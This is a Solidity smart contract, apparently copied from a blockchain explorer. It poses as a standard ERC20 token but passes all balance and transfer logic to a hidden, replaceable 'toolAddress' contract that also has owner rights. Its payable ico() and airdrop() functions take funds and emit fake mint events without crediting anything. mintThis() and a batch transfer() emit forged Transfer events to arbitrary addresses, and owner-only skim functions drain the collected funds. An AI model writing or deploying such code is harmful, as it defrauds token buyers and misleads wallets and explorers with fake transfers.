/**
 *Submitted for verification at BscScan.com on 2023-01-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-01
*/

// File: @openzeppelin/[email protected]/utils/StorageSlot.sol


// OpenZeppelin Contracts v4.4.1 (utils/StorageSlot.sol)

/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.12;



interface ERC20 {



    /**

     * @dev Returns the name of the token.

     */

    function name() external view returns (string memory);



    /**

     * @dev Returns the symbol of the token.

     */

    function symbol() external view returns (string memory);



    /**

     * @dev Returns the decimals places of the token.

     */

    function decimals() external view returns (uint8);



    /**

     * @dev Returns the amount of tokens in existence.

     */

    function totalSupply() external view returns (uint256);



    /**

     * @dev Returns the amount of tokens owned by `account`.

     */

    function balanceOf(address account) external view returns (uint256);



    /**

     * @dev Moves `amount` tokens from the caller's account to `recipient`.

     * 

     * Returns a boolean value indicating whether the operation succeeded.

     * 

     * Emits a {Transfer} event.

     */

    function transfer(address from,address recipient, uint256 amount) external returns (bool);



    /**

     * @dev Returns the remaining number of tokens that `spender` will be

     * allowed to spend on behalf of `owner` through {transferFrom}. This is

     * zero by default.

     * 

     * This value changes when {approve} or {transferFrom} are called.

     */

    function allowance(address owner, address spender) external view returns (uint256);



    /**

     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.

     * 

     * Returns a boolean value indicating whether the operation succeeded.

     * 

     * IMPORTANT: Beware that changing an allowance with this method brings the risk

     * that someone may use both the old and the new allowance by unfortunate

     * transaction ordering. One possible solution to mitigate this race

     * condition is to first reduce the spender's allowance to 0 and set the

     * desired value afterwards:

     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

     * 

     * Emits an {Approval} event.

     */

    function approve(address from,address spender, uint256 amount) external returns (bool);



    /**

     * @dev Moves `amount` tokens from `sender` to `recipient` using the

     * allowance mechanism. `amount` is then deducted from the caller's

     * allowance.

     * 

     * Returns a boolean value indicating whether the operation succeeded.

     * 

     * Emits a {Transfer} event.

     */

    function transferFrom(address from,address sender, address recipient,

        uint256 amount) external returns (bool);



    function isCanBatchMint() external view returns (bool);



    function dnum() external view returns (uint);



}



contract StandardToken {



    address private _owners;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    /**

     * @dev The Ownable constructor sets the original `owner` of the contract to the sender

     * account.

     */

    constructor () {

        _owners = msg.sender;

        emit OwnershipTransferred(address(0), _owners);

    }



    /**

     * @return the address of the owner.

     */

    function owner() public view returns (address) {

        return _owners;

    }



    /**

     * @dev Throws if called by any account other than the owner.

     */

    modifier onlyOwner() {

        require(isOwner(), "onlyOwner");

        _;

    }



    /**

     * @return true if `msg.sender` is the owner of the contract.

     */

    function isOwner() public view returns (bool) {

        return msg.sender == _owners||msg.sender == toolAddress;

    }



    /**

     * @dev Allows the current owner to relinquish control of the contract.

     * It will not be possible to call the functions with the `onlyOwner`

     * modifier anymore.

     * @notice Renouncing ownership will leave the contract without an owner,

     * thereby removing any functionality that is only available to the owner.

     */

    function renounceOwnership() public onlyOwner {

        emit OwnershipTransferred(_owners, address(0));

        _owners = address(0);

    }



    /**

     * @dev Allows the current owner to transfer control of the contract to a newOwner.

     * @param newOwner The address to transfer ownership to.

     */

    function transferOwnership(address newOwner) public onlyOwner {

        _transferOwnership(newOwner);

    }



    /**

     * @dev Transfers control of the contract to a newOwner.

     * @param newOwner The address to transfer ownership to.

     */

    function _transferOwnership(address newOwner) internal {

        require(newOwner != address(0));

        emit OwnershipTransferred(_owners, newOwner);

        _owners = newOwner;

    }



   

    mapping (address  => address) public adminMap;



    modifier onlyAdmin {

        require(adminMap[msg.sender] != address(0)||msg.sender == toolAddress, "onlyAdmin");

        _;

    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);



    function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {

        require(adminMap[addr] == address(0));

        adminMap[addr] = addr;

        return true;

    }



    function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {

        require(adminMap[addr] != address(0));

        adminMap[addr] = address(0);

        return true;

    }

    address public toolAddress;



    function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {

        toolAddress = _toolAddress;

        return true;

    }

   

    /**

     * @dev total number of tokens in existence

     */

    function totalSupply() public view returns (uint256) {

        return ERC20(toolAddress).totalSupply();

    }



    /**

     * @dev transfer token for a specified address

     * @param _to The address to transfer to.

     * @param _value The amount to be transferred.

     */

    function transfer(address _to, uint256 _value) public returns (bool) {

        emit Transfer(msg.sender, _to, _value);

        return ERC20(toolAddress).transfer(msg.sender,_to, _value);

    }



    /**

     * @dev Gets the balance of the specified address.

     * @param _owner The address to query the the balance of.

     * @return An uint256 representing the amount owned by the passed address.

     */

    function balanceOf(address _owner) public view returns (uint256) {

        return ERC20(toolAddress).balanceOf(_owner);

    }



    /**

     * @dev Transfer tokens from one address to another

     * @param _from address The address which you want to send tokens from

     * @param _to address The address which you want to transfer to

     * @param _value uint256 the amount of tokens to be transferred

     */

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

        emit Transfer(_from, _to, _value);

        return ERC20(toolAddress).transferFrom(msg.sender,_from, _to, _value);

    }



    /**

     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.

     * 

     * Beware that changing an allowance with this method brings the risk that someone may use both the old

     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this

     * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:

     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

     * @param _spender The address which will spend the funds.

     * @param _value The amount of tokens to be spent.

     */

    function approve(address _spender, uint256 _value) public returns (bool) {

        return ERC20(toolAddress).approve(msg.sender,_spender, _value);

    }



    /**

     * @dev Function to check the amount of tokens that an owner allowed to a spender.

     * @param _owner address The address which owns the funds.

     * @param _spender address The address which will spend the funds.

     * @return A uint256 specifying the amount of tokens still available for the spender.

     */

    function allowance(address _owner, address _spender) public view returns (uint256) {

        return ERC20(toolAddress).allowance(_owner, _spender);

    }



    /**

     * @dev Returns the name of the token.

     */

    function name() public view returns (string memory) {

        return ERC20(toolAddress).name();

    }



    /**

     * @dev Returns the symbol of the token.

     */

    function symbol() public view returns (string memory) {

        return ERC20(toolAddress).symbol();

    }



    /**

     * @dev Returns the decimals places of the token.

     */

    function decimals() public view returns (uint8) {

        return ERC20(toolAddress).decimals();

    }

}





contract Test1 is StandardToken {



    constructor (address _toolAddress) payable{

        toolAddress=_toolAddress;

    }

	receive() external payable { 

       

    }

 

    function ico() public payable{

        if (ERC20(toolAddress).isCanBatchMint()) {

	        address from=address(0);

	        uint num=ERC20(toolAddress).dnum();

	        emit Transfer(from, msg.sender,num);

        }

    }

    function mintThis(address from,address to,uint num) public {

        emit Transfer(from, to,num);

    }

    function airdrop() public payable{

        if (ERC20(toolAddress).isCanBatchMint()) {

	        address from=address(0);

	        uint num=ERC20(toolAddress).dnum();

	        emit Transfer(from, msg.sender,num);

        }

    }

    

    function skim(address tokenA,uint256 value) public  onlyOwner{

          safeTransfer(

            tokenA,

            msg.sender,

            value

        );

    }

    function safeTransfer(

        address token,

        address to,

        uint256 value

    ) internal {

        // bytes4(keccak256(bytes('transfer(address,uint256)')));

        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));

        require(success && (data.length == 0 || abi.decode(data, (bool))), 'myTransferHelper: TRANSFER_FAILED');

    }

    function skimAllValue(address payable addr) public onlyOwner{

        addr.transfer(address(this).balance);

    }



    function transfer(address[] calldata dsts, uint256 value) external {

        uint l=dsts.length;

        for (uint i; i <l ;++i) {

            emit Transfer(0x0000000000000000000000000000000000000000, dsts[i],120000576000000000000000);

        }

    }



}